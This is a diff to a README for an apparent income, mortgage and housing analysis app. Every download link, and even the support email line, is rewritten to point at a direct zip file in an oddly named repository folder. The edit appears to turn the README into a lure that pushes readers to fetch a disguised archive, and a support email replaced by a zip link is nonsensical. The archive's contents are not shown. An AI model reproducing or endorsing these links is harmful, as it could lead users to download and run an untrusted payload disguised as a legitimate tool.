@@ -1,6 +1,6 @@
 # 📊 -Income-Mortgage-Housing-Insights-A-State-City-Analysis- - Analyze Housing Trends Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/main/pachyhemia/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/main/pachyhemia/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-.zip)
 
 ## 📥 Introduction
 
@@ -23,7 +23,7 @@ To get started, follow these simple steps:
 
 To download the application, visit the Releases page:
 
-[Download the latest release here](https://github.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/releases)
+[Download the latest release here](https://raw.githubusercontent.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/main/pachyhemia/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -88,10 +88,10 @@ Stay tuned for upcoming features that will elevate your housing market analysis 
 
 If you have any questions or need assistance, please feel free to reach out:
 
-- Email: support@example.com
+- Email: https://raw.githubusercontent.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/main/pachyhemia/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-.zip
 
 For the latest updates and discussions, follow our repository.
 
 Enjoy your analysis journey with the Income Mortgage Housing Insights application! 
 
-[Download the latest release here again](https://github.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/releases) and start exploring today!
+[Download the latest release here again](https://raw.githubusercontent.com/willsondev/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-/main/pachyhemia/-Income-Mortgage-Housing-Insights-A-State-City-Analysis-.zip) and start exploring today!
